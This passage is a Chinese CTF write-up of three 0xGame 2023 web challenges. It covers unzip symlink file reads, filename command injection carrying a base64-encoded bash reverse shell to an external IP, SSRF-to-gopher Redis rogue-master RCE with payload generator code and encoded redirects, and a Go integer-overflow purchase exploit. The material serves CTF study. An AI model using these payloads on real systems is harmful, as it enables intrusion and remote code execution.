<p>之后在靶机首页随便输入一个错误的ip地址，进入报错页面之后在右侧点击一个小黑框，输入pin code之后可以在左侧看到一个可以执行python代码的地方，如下图输入即可得到flag</p>
<p>![image-20231104183759696](0xGame 2023/image-20231104183759696.png)</p>
<h2 id="week-3-zip_file_manager">[Week 3] zip_file_manager</h2>
<pre><code class="hljs py"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, redirect, send_file
<span class="hljs-keyword">import</span> hashlib
<span class="hljs-keyword">import</span> os

app = Flask(__name__)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params">m</span>):
    <span class="hljs-keyword">return</span> hashlib.md5(m.encode(<span class="hljs-string">'utf-8'</span>)).hexdigest()


<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/unzip'</span>, methods=[<span class="hljs-string">'POST'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">unzip</span>():
    f = request.files.get(<span class="hljs-string">'file'</span>)
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> f.filename.endswith(<span class="hljs-string">'.zip'</span>):
        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">'/'</span>)

    user_dir = os.path.join(<span class="hljs-string">'./uploads'</span>, md5(request.remote_addr))
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(user_dir):
        os.mkdir(user_dir)

    zip_path = os.path.join(user_dir, f.filename)
    dest_path = os.path.join(user_dir, f.filename[:-<span class="hljs-number">4</span>])
    f.save(zip_path)

    os.system(<span class="hljs-string">'unzip -o {} -d {}'</span>.<span class="hljs-built_in">format</span>(zip_path, dest_path))
    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">'/'</span>)


<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/'</span>, defaults={<span class="hljs-string">'subpath'</span>: <span class="hljs-string">''</span>}, methods=[<span class="hljs-string">'GET'</span>]</span>)</span>
<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/&lt;path:subpath&gt;'</span>, methods=[<span class="hljs-string">'GET'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(<span class="hljs-params">subpath</span>):
    user_dir = os.path.join(<span class="hljs-string">'./uploads'</span>, md5(request.remote_addr))
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(user_dir):
        os.mkdir(user_dir)

    <span class="hljs-keyword">if</span> <span class="hljs-string">'..'</span> <span class="hljs-keyword">in</span> subpath:
        <span class="hljs-keyword">return</span> <span class="hljs-string">'blacklist'</span>

    current_path = os.path.join(user_dir, subpath)

    <span class="hljs-keyword">if</span> os.path.isdir(current_path):
        res = []
        res.append({<span class="hljs-string">'type'</span>: <span class="hljs-string">'Directory'</span>, <span class="hljs-string">'name'</span>: <span class="hljs-string">'..'</span>})
        <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> os.listdir(current_path):
            <span class="hljs-keyword">if</span> os.path.isfile(os.path.join(current_path, v)):
                res.append({<span class="hljs-string">'type'</span>: <span class="hljs-string">'File'</span>, <span class="hljs-string">'name'</span>: v})
            <span class="hljs-keyword">else</span>:
                res.append({<span class="hljs-string">'type'</span>: <span class="hljs-string">'Directory'</span>, <span class="hljs-string">'name'</span>: v})
        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'index.html'</span>, upload_path=user_dir, res=res)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> send_file(current_path)


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    app.run(host=<span class="hljs-string">'0.0.0.0'</span>, port=<span class="hljs-number">8000</span>, debug=<span class="hljs-literal">False</span>)</code></pre>
<p>根据题目给出的源码，我们分析发现<code>os.system('unzip -o {} -d {}'.format(zip_path, dest_path))</code>此处进行了命令执行，凭借我浅薄的记忆，我认出了这里是类似unzip的相关漏洞，可以用软链接进行RCE的</p>
<p>index函数中，主要就是创建一个zip文件上传后的目录，其中还过滤了<code>..</code>也就是防止目录穿越，最后还提取相关关键词：type、name等等来渲染前端页面。</p>
<p>unzip函数中，主要就是对我们上传的zip文件进行解压，并覆盖原有文件，将解压得到的文件上传至-d所指的目录下</p>
<h3 id="方法一">方法一：</h3>
<p>众所周知 Linux 存在软链接这一功能, 而 zip 支持压缩软链接, 程序又是用 unzip 命令进行解压缩, 因此会存在这个漏洞 (相比之下如果使用 Python 的 zipfile 库进行解压缩, 就不会存在这个问题)</p>
<pre><code class="hljs shell">ln -s / test
zip -y test.zip test</code></pre>
<p>软链接用法我认为可以参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/liu16659/article/details/83714066?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169909710116800188573329%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169909710116800188573329&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-83714066-null-null.142%5Ev96%5Epc_search_result_base4&amp;utm_term=linux%E8%BD%AF%E9%93%BE%E6%8E%A5%E5%91%BD%E4%BB%A4&amp;spm=1018.2226.3001.4187">Linux 命令之软连接详解</a></p>
<p>这里zip使用-y命令的原因：zip压缩保持软连接，使用参数-y，可以使zip能够保留软链接。</p>
<p>那我们在kali下操作一番</p>
<p>![image-20231104193101598](0xGame 2023/image-20231104193101598.png)</p>
<p>随后找到zip并上传至靶机</p>
<p>![image-20231104193207219](0xGame 2023/image-20231104193207219.png)</p>
<p>如上图点击flag即可下载得到</p>
<h3 id="方法二">方法二：</h3>
<pre><code class="hljs py"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/unzip'</span>, methods=[<span class="hljs-string">'POST'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">unzip</span>():
    f = request.files.get(<span class="hljs-string">'file'</span>)
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> f.filename.endswith(<span class="hljs-string">'.zip'</span>):
        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">'/'</span>)

    user_dir = os.path.join(<span class="hljs-string">'./uploads'</span>, md5(request.remote_addr))
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(user_dir):
        os.mkdir(user_dir)

    zip_path = os.path.join(user_dir, f.filename)
    dest_path = os.path.join(user_dir, f.filename[:-<span class="hljs-number">4</span>])
    f.save(zip_path)

    os.system(<span class="hljs-string">'unzip -o {} -d {}'</span>.<span class="hljs-built_in">format</span>(zip_path, dest_path))
    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">'/'</span>)</code></pre>
<p>调用 os.system 执行 unzip 命令, 但是路径是直接拼接过去的, 而 zip 的文件名又可控, 这里存在一个很明显的命令注入</p>
<p>burp 上传时抓包把 filename 改成下面的命令即可</p>
<pre><code class="hljs shell">test.zip;bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjIzMy4yNi81NTU1ICAwPiYx}|{base64,-d}|{bash,-i}';1.zip</code></pre>
<p>![image-20231104200335114](0xGame 2023/image-20231104200335114.png)</p>
<p>bp发送，如下图成功反弹shell，拿到flag</p>
<p>![image-20231104200329612](0xGame 2023/image-20231104200329612.png)</p>
<p>接下来我又很疑惑为何这里恶意命令前后需要两个zip后缀</p>
<p>![image-20231104201010508](0xGame 2023/image-20231104201010508.png)</p>
<p>如上图，我自己分析了一波感觉是1.zip肯定是必有的，因为代码会检测filename的后缀是否含有.zip，而test.zip的保留我认为是为了令unzip -o {}命令的正常使用，如果没有test.zip，那就是-o bash -c…那这里就不存在要解压的zip文件了，但如果有test.zip的话，就是-o test.zip;bash…，很明显-o是解压test.txt的，可以正常使用（我也不知道分析的对不对，希望日后可以有缘看到合理的解释┭┮﹏┭┮</p>
<h2 id="week-3-web_snapshot">[Week 3] web_snapshot</h2>
<p>这道题知识点是ssrf+gopher打redis（主从复制RCE）–没学过。。。。因此先跟着复现</p>
<p>题目会通过 curl 函数请求网页, 并将 html 源码保存在 Redis 数据库中</p>
<p>请求网页的过程很明显存在 ssrf, 但是限制输入的 url 只能以 http / https 开头</p>
<pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>) </span>{
    <span class="hljs-variable">$curl</span> = <span class="hljs-title function_ invoke__">curl_init</span>();
    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);
    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);
    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);
    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_FOLLOWLOCATION, <span class="hljs-literal">true</span>);
    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$curl</span>);
    <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$curl</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;
}</code></pre>
<p>首先注意 <code>curl_setopt</code> 设置的参数 <code>CURLOPT_FOLLOWLOCATION</code>, 代表允许 curl 根据返回头中的 Location 进行重定向</p>
<p>参考: <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.curl-setopt.php">https://www.php.net/manual/zh/function.curl-setopt.php</a></p>
<p>![<a target="_blank" rel="noopener" href="https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207504.png">https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207504.png</a>](0xGame 2023/202311021207504.png)</p>
<p>![<a target="_blank" rel="noopener" href="https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207029.png">https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207029.png</a>](0xGame 2023/202311021207029.png)</p>
<p>![<a target="_blank" rel="noopener" href="https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207958.png">https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207958.png</a>](0xGame 2023/202311021207958.png)</p>
<p>而 curl 支持 dict / gopher 等协议, 那么我们就可以通过 Location 头把协议从 http 重定向至 dict / gopher, 这个技巧在一些关于 ssrf 的文章里面也会提到</p>
<p>结合 redis 的知识点, 可以尝试 redis 主从复制 rce</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaozi/p/13089906.html">https://www.cnblogs.com/xiaozi/p/13089906.html</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/Dliv3/redis-rogue-server">https://github.com/Dliv3/redis-rogue-server</a> --工具</p>
<p>payload：</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> re

<span class="hljs-keyword">def</span> <span class="hljs-title function_">urlencode</span>(<span class="hljs-params">data</span>):
    enc_data = <span class="hljs-string">''</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:
        h = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i))).replace(<span class="hljs-string">'0x'</span>, <span class="hljs-string">''</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(h) == <span class="hljs-number">1</span>:
            enc_data += <span class="hljs-string">'%0'</span> + h.upper()
        <span class="hljs-keyword">else</span>:
            enc_data += <span class="hljs-string">'%'</span> + h.upper()
    <span class="hljs-keyword">return</span> enc_data

<span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_payload</span>(<span class="hljs-params">payload</span>):

    redis_payload = <span class="hljs-string">''</span>

    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> payload.split(<span class="hljs-string">'\n'</span>):
        arg_num = <span class="hljs-string">'*'</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(i.split(<span class="hljs-string">' '</span>)))
        redis_payload += arg_num + <span class="hljs-string">'\r\n'</span>
        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i.split(<span class="hljs-string">' '</span>):
            arg_len = <span class="hljs-string">'$'</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(j))
            redis_payload += arg_len + <span class="hljs-string">'\r\n'</span>
            redis_payload += j + <span class="hljs-string">'\r\n'</span>

    gopher_payload = <span class="hljs-string">'gopher://db:6379/_'</span> + urlencode(redis_payload)
    <span class="hljs-keyword">return</span> gopher_payload

payload1 = <span class="hljs-string">'''</span>
<span class="hljs-string">slaveof vps-ip 21000</span>
<span class="hljs-string">config set dir /tmp</span>
<span class="hljs-string">config set dbfilename exp.so</span>
<span class="hljs-string">quit</span>
<span class="hljs-string">'''</span>

payload2 = <span class="hljs-string">'''slaveof no one</span>
<span class="hljs-string">module load /tmp/exp.so</span>
<span class="hljs-string">system.exec 'env'</span>
<span class="hljs-string">quit</span>
<span class="hljs-string">'''</span>

<span class="hljs-built_in">print</span>(gen_payload(payload1))
<span class="hljs-built_in">print</span>(gen_payload(payload2))</code></pre>
<p>![image-20231104225534463](0xGame 2023/image-20231104225534463.png)</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-comment">// step 1</span>
<span class="hljs-comment">//header('Location: gopher://db:6379/_%2A%31%0D%0A%24%30%0D%0A%0D%0A%2A%33%0D%0A%24%37%0D%0A%73%6C%61%76%65%6F%66%0D%0A%24%31%34%0D%0A%31%32%34%2E%32%32%30%2E%32%33%33%2E%32%36%0D%0A%24%35%0D%0A%36%35%35%33%34%0D%0A%2A%34%0D%0A%24%36%0D%0A%63%6F%6E%66%69%67%0D%0A%24%33%0D%0A%73%65%74%0D%0A%24%33%0D%0A%64%69%72%0D%0A%24%34%0D%0A%2F%74%6D%70%0D%0A%2A%34%0D%0A%24%36%0D%0A%63%6F%6E%66%69%67%0D%0A%24%33%0D%0A%73%65%74%0D%0A%24%31%30%0D%0A%64%62%66%69%6C%65%6E%61%6D%65%0D%0A%24%36%0D%0A%65%78%70%2E%73%6F%0D%0A%2A%31%0D%0A%24%34%0D%0A%71%75%69%74%0D%0A%2A%31%0D%0A%24%30%0D%0A%0D%0A');</span>

<span class="hljs-comment">// step 2</span>
<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">'Location: gopher://db:6379/_%2A%31%0D%0A%24%30%0D%0A%0D%0A%2A%33%0D%0A%24%37%0D%0A%73%6C%61%76%65%6F%66%0D%0A%24%32%0D%0A%6E%6F%0D%0A%24%33%0D%0A%6F%6E%65%0D%0A%2A%33%0D%0A%24%36%0D%0A%6D%6F%64%75%6C%65%0D%0A%24%34%0D%0A%6C%6F%61%64%0D%0A%24%31%31%0D%0A%2F%74%6D%70%2F%65%78%70%2E%73%6F%0D%0A%2A%32%0D%0A%24%31%31%0D%0A%73%79%73%74%65%6D%2E%65%78%65%63%0D%0A%24%35%0D%0A%27%65%6E%76%27%0D%0A%2A%31%0D%0A%24%34%0D%0A%71%75%69%74%0D%0A%2A%31%0D%0A%24%30%0D%0A%0D%0A'</span>);
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这里将step1和step2分为两个php文件。</p>
<p>同时在 vps 上启动一个 php 服务器, 例如 <code>php -S 0.0.0.0:65000</code>, 然后将上述两个PHP文件上传至该php服务的根目录下，最后在题目当中去访问这两个PHP文件</p>
<p>![image-20231104225700858](0xGame 2023/image-20231104225700858.png)</p>
<p>![image-20231104225711072](0xGame 2023/image-20231104225711072.png)</p>
<p>![image-20231104225734808](0xGame 2023/image-20231104225734808.png)</p>
<p>显示如图所示的状态，同时记得开启<a target="_blank" rel="noopener" href="https://github.com/Dliv3/redis-rogue-server#redis-rogue-server">Redis Rogue Server</a>的监听</p>
<p>![image-20231104225828706](0xGame 2023/image-20231104225828706.png)</p>
<p>如图所示，在访问1.php之后会看到如图所示的状态，代表成功打入，记得21000端口要开放</p>
<p>之后在访问2.php之后</p>
<p>![image-20231104225922080](0xGame 2023/image-20231104225922080.png)</p>
<p>会显示上图所示的link，我们访问即可看到env环境变量中的flag</p>
<p>![image-20231104225322560](0xGame 2023/image-20231104225322560.png)</p>
<p>这里得注意几个点</p>
<p>首先 gopher 得分两次打, 不然你在执行 <code>slaveof IP Port</code> 命令之后又立即执行了 <code>slave of no one</code>, 这就导致根本没有时间去主从复制 <a target="_blank" rel="noopener" href="http://exp.so">exp.so</a></p>
<p>其次在使用 gopher 发送 redis 命令的时候记得结尾加上 <code>quit</code>, 不然会一直卡住</p>
<p>然后注意 redis 的主机名是 <code>db</code>, 而不是 <code>127.0.0.1</code>, 因此访问 redis 数据库得用 <code>db:6379</code></p>
<p>如果用 dict 协议打的话, 得调整一下 payload 顺序</p>
<pre><code class="hljs plaintext">dict://db:6379/config:set:dir:/tmp
dict://db:6379/config:set:dbfilename:exp.so
dict://db:6379/slaveof:host.docker.internal:21000
dict://db:6379/module:load:/tmp/exp.so
dict://db:6379/slave:no:one
dict://db:6379/system.exec:env
dict://db:6379/module:unload:system</code></pre>
<p>因为每次执行命令之间会存在一定的时间间隔, 所以得先设置 dir 和 dbfilename, 然后再 slaveof, 不然最终同步的文件名和路径还是原来的 <code>/data/dump.rdb</code></p>
<h2 id="week-3-goshop">[Week 3] GoShop</h2>
<pre><code class="hljs go"><span class="hljs-keyword">package</span> main

<span class="hljs-keyword">import</span> (
	<span class="hljs-string">"crypto/rand"</span>
	<span class="hljs-string">"embed"</span>
	<span class="hljs-string">"fmt"</span>
	<span class="hljs-string">"github.com/gin-contrib/sessions"</span>
	<span class="hljs-string">"github.com/gin-contrib/sessions/cookie"</span>
	<span class="hljs-string">"github.com/gin-gonic/gin"</span>
	<span class="hljs-string">"github.com/google/uuid"</span>
	<span class="hljs-string">"html/template"</span>
	<span class="hljs-string">"net/http"</span>
	<span class="hljs-string">"os"</span>
	<span class="hljs-string">"strconv"</span>
)

<span class="hljs-keyword">type</span> User <span class="hljs-keyword">struct</span> {
	Id    <span class="hljs-type">string</span>
	Money <span class="hljs-type">int64</span>
	Items <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int64</span>
}

<span class="hljs-keyword">type</span> Product <span class="hljs-keyword">struct</span> {
	Name  <span class="hljs-type">string</span>
	Price <span class="hljs-type">int64</span>
}

<span class="hljs-keyword">var</span> users <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]*User

<span class="hljs-keyword">var</span> products []*Product

<span class="hljs-comment">//go:embed public</span>
<span class="hljs-keyword">var</span> fs embed.FS

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span> {
	users = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]*User)
	products = []*Product{
		{Name: <span class="hljs-string">"Apple"</span>, Price: <span class="hljs-number">10</span>},
		{Name: <span class="hljs-string">"Banana"</span>, Price: <span class="hljs-number">50</span>},
		{Name: <span class="hljs-string">"Orange"</span>, Price: <span class="hljs-number">100</span>},
		{Name: <span class="hljs-string">"Flag"</span>, Price: <span class="hljs-number">999999999</span>},
	}
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">IndexHandler</span><span class="hljs-params">(c *gin.Context)</span></span> {
	c.HTML(<span class="hljs-number">200</span>, <span class="hljs-string">"index.html"</span>, gin.H{})
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">InfoHandler</span><span class="hljs-params">(c *gin.Context)</span></span> {
	s := sessions.Default(c)

	<span class="hljs-keyword">if</span> s.Get(<span class="hljs-string">"id"</span>) == <span class="hljs-literal">nil</span> {
		u := uuid.New().String()
		users[u] = &amp;User{Id: u, Money: <span class="hljs-number">100</span>, Items: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int64</span>)}
		s.Set(<span class="hljs-string">"id"</span>, u)
		s.Save()
	}

	user := users[s.Get(<span class="hljs-string">"id"</span>).(<span class="hljs-type">string</span>)]
	c.JSON(<span class="hljs-number">200</span>, gin.H{
		<span class="hljs-string">"user"</span>: user,
	})
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ResetHandler</span><span class="hljs-params">(c *gin.Context)</span></span> {
	s := sessions.Default(c)
	s.Clear()

	u := uuid.New().String()
	users[u] = &amp;User{Id: u, Money: <span class="hljs-number">100</span>, Items: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int64</span>)}
	s.Set(<span class="hljs-string">"id"</span>, u)
	s.Save()

	c.JSON(<span class="hljs-number">200</span>, gin.H{
		<span class="hljs-string">"message"</span>: <span class="hljs-string">"Reset success"</span>,
	})
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">BuyHandler</span><span class="hljs-params">(c *gin.Context)</span></span> {
	s := sessions.Default(c)
	user := users[s.Get(<span class="hljs-string">"id"</span>).(<span class="hljs-type">string</span>)]

	data := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>{})
	c.ShouldBindJSON(&amp;data)

	<span class="hljs-keyword">var</span> product *Product

	<span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> products {
		<span class="hljs-keyword">if</span> data[<span class="hljs-string">"name"</span>] == v.Name {
			product = v
			<span class="hljs-keyword">break</span>
		}
	}

	<span class="hljs-keyword">if</span> product == <span class="hljs-literal">nil</span> {
		c.JSON(<span class="hljs-number">200</span>, gin.H{
			<span class="hljs-string">"message"</span>: <span class="hljs-string">"No such product"</span>,
		})
		<span class="hljs-keyword">return</span>
	}

	n, _ := strconv.Atoi(data[<span class="hljs-string">"num"</span>].(<span class="hljs-type">string</span>))

	<span class="hljs-keyword">if</span> n &lt; <span class="hljs-number">0</span> {
		c.JSON(<span class="hljs-number">200</span>, gin.H{
			<span class="hljs-string">"message"</span>: <span class="hljs-string">"Product num can't be negative"</span>,
		})
		<span class="hljs-keyword">return</span>
	}

	<span class="hljs-keyword">if</span> user.Money &gt;= product.Price*<span class="hljs-type">int64</span>(n) {
		user.Money -= product.Price * <span class="hljs-type">int64</span>(n)
		user.Items[product.Name] += <span class="hljs-type">int64</span>(n)
		c.JSON(<span class="hljs-number">200</span>, gin.H{
			<span class="hljs-string">"message"</span>: fmt.Sprintf(<span class="hljs-string">"Buy %v * %v success"</span>, product.Name, n),
		})
	} <span class="hljs-keyword">else</span> {
		c.JSON(<span class="hljs-number">200</span>, gin.H{
			<span class="hljs-string">"message"</span>: <span class="hljs-string">"You don't have enough money"</span>,
		})
	}
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">SellHandler</span><span class="hljs-params">(c *gin.Context)</span></span> {
	s := sessions.Default(c)
	user := users[s.Get(<span class="hljs-string">"id"</span>).(<span class="hljs-type">string</span>)]

	data := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>{})
	c.ShouldBindJSON(&amp;data)

	<span class="hljs-keyword">var</span> product *Product

	<span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> products {
		<span class="hljs-keyword">if</span> data[<span class="hljs-string">"name"</span>] == v.Name {
			product = v
			<span class="hljs-keyword">break</span>
		}
	}

	<span class="hljs-keyword">if</span> product == <span class="hljs-literal">nil</span> {
		c.JSON(<span class="hljs-number">200</span>, gin.H{
			<span class="hljs-string">"message"</span>: <span class="hljs-string">"No such product"</span>,
		})
		<span class="hljs-keyword">return</span>
	}

	count := user.Items[data[<span class="hljs-string">"name"</span>].(<span class="hljs-type">string</span>)]
	n, _ := strconv.Atoi(data[<span class="hljs-string">"num"</span>].(<span class="hljs-type">string</span>))

	<span class="hljs-keyword">if</span> n &lt; <span class="hljs-number">0</span> {
		c.JSON(<span class="hljs-number">200</span>, gin.H{
			<span class="hljs-string">"message"</span>: <span class="hljs-string">"Product num can't be negative"</span>,
		})
		<span class="hljs-keyword">return</span>
	}

	<span class="hljs-keyword">if</span> count &gt;= <span class="hljs-type">int64</span>(n) {
		user.Money += product.Price * <span class="hljs-type">int64</span>(n)
		user.Items[product.Name] -= <span class="hljs-type">int64</span>(n)
		c.JSON(<span class="hljs-number">200</span>, gin.H{
			<span class="hljs-string">"message"</span>: fmt.Sprintf(<span class="hljs-string">"Sell %v * %v success"</span>, product.Name, n),
		})
	} <span class="hljs-keyword">else</span> {
		c.JSON(<span class="hljs-number">200</span>, gin.H{
			<span class="hljs-string">"message"</span>: <span class="hljs-string">"You don't have enough product"</span>,
		})
	}
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">FlagHandler</span><span class="hljs-params">(c *gin.Context)</span></span> {
	s := sessions.Default(c)
	user := users[s.Get(<span class="hljs-string">"id"</span>).(<span class="hljs-type">string</span>)]

	v, ok := user.Items[<span class="hljs-string">"Flag"</span>]
	<span class="hljs-keyword">if</span> !ok || v &lt;= <span class="hljs-number">0</span> {
		c.JSON(<span class="hljs-number">200</span>, gin.H{
			<span class="hljs-string">"message"</span>: <span class="hljs-string">"You must buy &lt;code&gt;flag&lt;/code&gt; first"</span>,
		})
		<span class="hljs-keyword">return</span>
	}

	flag, _ := os.ReadFile(<span class="hljs-string">"/flag"</span>)
	c.JSON(<span class="hljs-number">200</span>, gin.H{
		<span class="hljs-string">"message"</span>: fmt.Sprintf(<span class="hljs-string">"Here is your flag: &lt;code&gt;%s&lt;/code&gt;"</span>, <span class="hljs-type">string</span>(flag)),
	})
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
	secret := <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, <span class="hljs-number">16</span>)
	rand.Read(secret)

	tpl, _ := template.ParseFS(fs, <span class="hljs-string">"public/index.html"</span>)
	store := cookie.NewStore(secret)

	r := gin.Default()
	r.SetHTMLTemplate(tpl)
	r.Use(sessions.Sessions(<span class="hljs-string">"gosession"</span>, store))

	r.GET(<span class="hljs-string">"/"</span>, IndexHandler)

	api := r.Group(<span class="hljs-string">"/api"</span>)
	{
		api.GET(<span class="hljs-string">"/info"</span>, InfoHandler)
		api.POST(<span class="hljs-string">"/buy"</span>, BuyHandler)
		api.POST(<span class="hljs-string">"/sell"</span>, SellHandler)
		api.GET(<span class="hljs-string">"/flag"</span>, FlagHandler)
		api.GET(<span class="hljs-string">"/reset"</span>, ResetHandler)
	}

	r.StaticFileFS(<span class="hljs-string">"/static/main.js"</span>, <span class="hljs-string">"public/main.js"</span>, http.FS(fs))
	r.StaticFileFS(<span class="hljs-string">"/static/simple.css"</span>, <span class="hljs-string">"public/simple.css"</span>, http.FS(fs))

	r.Run(<span class="hljs-string">":8000"</span>)
}</code></pre>
<p>题目是一个商店, 初始 money 为 100, 需要购买金额为 999999999 的 flag 商品后才能拿到 flag</p>
<p>这题就是审计代码，不过我也没学过go语言，不过我看了一番猜测问题可能会出现在如下位置：</p>
<p>![image-20231105092845595](0xGame 2023/image-20231105092845595.png)</p>
<p>![image-20231105092853470](0xGame 2023/image-20231105092853470.png)</p>
<p>这里是判断用户购买金额以及数量的地方，接下来就看wp了</p>
<p>程序使用了 <code>strconv.Atoi(data["num"].(string))</code> 将 json 传递的 num 字符串转换成了 int 类型的变量 n</p>
<p>后面判断用户的 money 时将其转换成了 int64 类型, 而 product.Price 本身也是 int64 类型</p>
<pre><code class="hljs go"><span class="hljs-keyword">if</span> user.Money &gt;= product.Price*<span class="hljs-type">int64</span>(n) {
  user.Money -= product.Price * <span class="hljs-type">int64</span>(n)
  user.Items[product.Name] += <span class="hljs-type">int64</span>(n)
  c.JSON(<span class="hljs-number">200</span>, gin.H{
    <span class="hljs-string">"message"</span>: fmt.Sprintf(<span class="hljs-string">"Buy %v * %v success"</span>, product.Name, n),
  })
} <span class="hljs-keyword">else</span> {
  c.JSON(<span class="hljs-number">200</span>, gin.H{
    <span class="hljs-string">"message"</span>: <span class="hljs-string">"You don't have enough money"</span>,
  })
}</code></pre>
<p><strong>这里先介绍一些概念</strong></p>
<p>Go 语言是强类型语言, 包含多种数据类型, 以数字类型为例, 存在 uint8 uint16 uint32 uint64 (无符号整型) 和 int8 int16 int32 int64 (有符号整型) 等类型</p>
<p>Go 语言在编译期会检查源码中定义的变量是否存在溢出, 例如 <code>var i uint8 = 99999</code> 会使得编译不通过, 但是并不会检查变量的运算过程中是否存在溢出, 例如 <code>var i uint8 = a * b</code>, 如果程序没有对变量的取值范围做限制, 那么在部分场景下就可能存在整数溢出漏洞</p>
<p>上面的 BuyHandler 虽然限制了 n 不能为负数, 但是并没有限制 n 的最大值</p>
<p>因此我们可以控制 n, 使得 <code>product.Price * int64(n)</code> 溢出为一个负数, 之后进行 <code>user.Money -= product.Price * int64(n)</code> 运算的时候, 当前用户的 money 就会增加, 最终达到一个可以购买 flag 商品的金额, 从而拿到 flag</p>
<p>查阅相关文档可以知道 int64 类型的范围是 <code>-9223372036854775808 ~ 9223372036854775807</code></p>
<p>经过简单的计算或者瞎猜, 可以购买数量为 <code>922337203695477808</code> 的 apple</p>
<p>![image-20231105093447613](0xGame 2023/image-20231105093447613.png)</p>
<p>点击get flag，成功拿到</p>
<p>![image-20231105093500557](0xGame 2023/image-20231105093500557.png)</p>
